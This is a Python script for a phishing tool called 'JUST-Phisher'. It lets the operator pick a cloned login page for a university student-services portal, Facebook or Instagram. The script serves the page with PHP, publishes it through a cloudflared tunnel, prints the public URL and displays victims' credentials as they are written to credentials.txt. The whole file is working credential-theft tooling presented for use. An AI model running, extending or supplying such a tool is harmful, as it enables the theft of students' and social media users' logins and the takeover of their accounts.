import pyfiglet
import subprocess
import signal
import sys
import os
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class Color:
    # Reset the color
    RESET = '\033[0m'

    # Regular colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'

    # Bright colors
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'

log_file = open("cf.log", "w")


class FileChangeHandler(FileSystemEventHandler):
    def on_modified(self, event):
        # Check if the modified file is credentials.txt
        if event.src_path.endswith("credentials.txt"):
            
            with open("credentials.txt", "r") as file:
                lines = file.readlines()
                last_lines = lines[-11:]  # Get the last 11 lines
                for line in last_lines:
                    print(line.strip())


def stop_subprocesses():
    # Terminate the PHP server and cloudflared tunnel subprocesses
    print("Terminating your website now .... ")
    if php_server and php_server.poll() is None:
        php_server.terminate()
    if cloudflared_tunnel and cloudflared_tunnel.poll() is None:
        cloudflared_tunnel.terminate()

    sys.exit(0)




ascii_banner = pyfiglet.figlet_format("JUST-Phisher")

print(ascii_banner)

print(Color.BLUE+"\nChoose the website that you want to generate: \n\n")

print(Color.YELLOW+"[1] : JUST Student Services login \n")
print(Color.BRIGHT_BLUE+"[2] : Facebook \n")
print(Color.RED+"[3] : Instagram \n"+Color.RESET)
option = input(Color.BRIGHT_BLUE+"Your choice: ")

def running_the_server(name):
    print(Color.GREEN+"\nYour website is being generated. Please wait...\n")
    try:
        # Start the PHP server
        php_server = subprocess.Popen(["php", "-S", "0.0.0.0:8050", "-t", f"./{name}"],
                                      stderr=subprocess.PIPE)

        # Start the cloudflared tunnel
        cloudflared_tunnel = subprocess.Popen(["./cloudflared-linux-amd64", "tunnel", "--url", "http://0.0.0.0:8050"],
                                               stderr=log_file, stdout=log_file)

        # Register the signal handler for Ctrl+C
        signal.signal(signal.SIGINT, stop_subprocesses)

        if (php_server.returncode == 0 or php_server.returncode is None) and (
                cloudflared_tunnel.returncode == 0 or cloudflared_tunnel.returncode is None):
            
            time.sleep(7)
            
            # Set up file change monitoring
            event_handler = FileChangeHandler()
            observer = Observer()
            observer.schedule(event_handler, path=".", recursive=False)
            observer.start()
            print(Color.GREEN+"\nWebsite generated successfully!\n")
            print(Color.BLUE+"Here is the generated url : \n")
            log_file.close()

            subprocess.Popen(["grep", "-io", "https://[^ ]*trycloudflare.com",
                              "cf.log"])
            time.sleep(3)
            print("\n")
            print(Color.RED+"Waiting for credentials...\n"+Color.RESET)
            php_server.wait()
            cloudflared_tunnel.wait()
            
            # Stop file change monitoring
            observer.stop()
            observer.join()
        else:
            print("\nErrors occurred while generating the website.")
    except KeyboardInterrupt:
        stop_subprocesses()
    except Exception as e:
        print("\nAn error occurred while generating the website:")
        print(str(e))

if option == "1":
    running_the_server("Student_services")
elif option == "3":
    running_the_server("Instagram")
elif option == "2":
    running_the_server("Facebook")
else:
	print(Color.BRIGHT_YELLOW+"\nplease enter a number within the options")
	
